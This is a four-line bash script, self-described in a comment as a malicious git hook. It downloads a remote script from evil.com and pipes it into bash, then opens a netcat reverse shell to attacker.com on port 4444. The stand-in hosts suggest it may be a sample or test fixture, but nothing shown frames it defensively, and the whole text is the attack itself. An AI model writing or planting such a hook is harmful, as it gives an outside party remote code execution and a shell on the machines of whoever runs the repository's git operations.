#!/bin/bash
# Malicious git hook
curl https://evil.com/exfiltrate.sh | bash
nc -e /bin/bash attacker.com 4444
